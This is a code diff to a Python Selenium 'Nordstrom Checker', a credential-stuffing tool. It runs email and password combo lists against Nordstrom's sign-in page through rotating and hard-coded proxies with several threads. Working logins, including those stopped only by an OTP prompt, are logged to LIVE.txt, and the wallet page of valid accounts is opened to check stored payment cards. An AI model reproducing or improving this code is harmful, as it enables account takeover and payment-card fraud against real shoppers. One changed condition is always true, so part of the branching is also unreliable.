@@ -171,10 +171,24 @@ class checker(object):
             self.hide_file(pluginfile)
             chrome_options.add_experimental_option(
                 'excludeSwitches', ['enable-logging'])
+            #chrome_options.add_argument("headless")
         driver = webdriver.Chrome(
             os.path.join(path, 'chromedriver'),
             options=chrome_options)
         os.remove(pluginfile)  # remove for change IP per thread
+        return driver
+
+    def geosurf(self, use_proxy=False):
+        path = os.path.dirname(os.path.abspath(__file__))
+        options = webdriver.ChromeOptions()
+        if use_proxy == True:
+            proxx = "195.201.107.67:10000"
+            options.add_experimental_option('excludeSwitches', ['enable-logging'])
+            options.add_argument(f'--proxy-server={proxx}')
+            options.add_argument('--disable-quic')
+        driver = webdriver.Chrome(
+            os.path.join(path, 'chromedriver'),
+            options=options)
         return driver
 
     def checker_main(self, email, password):
@@ -185,9 +199,11 @@ class checker(object):
             try:
                 #options = webdriver.ChromeOptions()
                 #options.add_experimental_option('excludeSwitches', ['enable-logging'])
-                # options.add_argument("headless")
+                #options.add_argument("headless")
                 #driver = webdriver.Chrome(options=options)
+
                 driver = self.get_chromedriver(use_proxy=True)
+                #driver = self.geosurf(use_proxy=True)
                 driver.set_page_load_timeout(60)
                 driver.get("https://secure.nordstrom.com/signin")
                 assert "Nordstrom" in driver.title
@@ -197,34 +213,37 @@ class checker(object):
                 sleep(1)
                 print(Fore.LIGHTMAGENTA_EX + "Checking login for Email: {} & Password: {}".format(email, password))
                 driver.find_element_by_xpath('//*[@id="sign-in"]/div[1]/label/div/input').send_keys(password)
-                sleep(1)
+                sleep(2)
                 driver.find_element_by_xpath('//*[@id="sign-in"]/div[1]/label/div/input').send_keys("\ue007")
-                sleep(5)
-                if """Your email or password wasn’t recognized.""" in driver.page_source:
-                    self.invalidAcc(email,password)
-                    driver.quit()
-                elif """account-forbidden""" in driver.current_url:
+                sleep(10)
+                if """account-forbidden""" in driver.current_url:
                     self.invalidAccUnknown(email,password)
                     driver.quit()
-                #elif """In Store: Shoes, Jewelry, Clothing, Makeup, Dresses""" in driver.page_source:
+                elif """secure.nordstorm""" in driver.current_url:
+                    driver.quit()
+                elif """Your email or password wasn’t recognized.""" in driver.page_source:
+                    self.invalidAcc(email,password)
+                    driver.quit()
+                elif """Let us know it’s you""" or """How should we send your code?""" in driver.page_source:
+                    checkOTP = """if (document.querySelectorAll("p")[0].textContent == 'To help keep your account safe from unwanted access, we’ll send you a code to verify.') {
+                        document.title = 'Check OTP';
+                    }"""
+                    #print(checkOTP)
+                    driver.execute_script(checkOTP)
+                    print(Fore.LIGHTGREEN_EX + "Login Success with Email: {} & Password: {}".format(email, password))
+                    checked += 1
+                    good += 1
+                    f = open("LIVE.txt", "a+")
+                    f.write("LIVE But OTP or Mail OTP - Checked by Jin - Nordstrom Checker|{}|{}\n".format(email, password))
+                    f.close()
+                    driver.quit()
                 elif """Nordstrom Your Account""" in driver.page_source:
                     driver.get('https://secure.nordstrom.com/my-account/wallet')
                     self.validAcc(email,password)
                     print("Checking card...")
                     driver.quit()
                 else:
-                    checkOTP = """if (document.querySelectorAll("p")[0].textContent == 'To help keep your account safe from unwanted access, we’ll send you a code to verify.') {
-                        document.title = 'Check OTP';
-                    }"""
-                    #print(checkOTP)
-                    driver.execute_script(checkOTP)
-                    print(Fore.LIGHTRED_EX + "Login Success with Email: {} & Password: {}".format(email, password))
-                    checked += 1
-                    good += 1
-                    f = open("LIVE.txt", "a+")
-                    f.write("LIVE But OTP - Checked by Jin - Nordstrom Checker|{}|{}\n".format(email, password))
-                    f.close()
-                    driver.quit()
+                    raise Exception
                 break
             except TimeoutException:
                 errors += 1
@@ -251,7 +270,7 @@ class checker(object):
 
     def threads(self):
         self.combo_loader()
-        self.threads = 5
+        self.threads = 3
         pool = Pool(self.threads)
         try:
             for _ in pool.imap_unordered(self.sender, self.combo_list):
